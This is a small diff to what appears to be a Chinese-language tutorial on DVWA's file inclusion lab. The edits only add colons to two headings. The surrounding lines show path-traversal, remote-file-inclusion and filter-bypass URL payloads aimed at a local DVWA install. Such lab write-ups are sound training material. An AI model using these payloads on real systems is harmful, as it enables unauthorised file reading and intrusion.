@@ -61,7 +61,7 @@ tags:
 http://localhost/dvwa/vulnerabilities/fi/?page=../../php.ini
 ```
 
-远程文件包含
+远程文件包含：
 
 ```txt
 http://localhost/dvwa/vulnerabilities/fi/?page=http://localhost/dvwa/php.ini
@@ -91,7 +91,7 @@ http://localhost/dvwa/vulnerabilities/fi/?page=..././..././php.ini
 http://localhost/dvwa/vulnerabilities/fi/?page=hthttp://tp://localhost/dvwa/php.ini
 ```
 
-或者直接用绝对路径(low 级别已经知道了服务器绝对路径)
+或者直接用绝对路径(low 级别已经知道了服务器绝对路径)：
 
 ```txt
 http://localhost/dvwa/vulnerabilities/fi/?page=F:\nginx-1.16.1\html\dvwa\php.ini
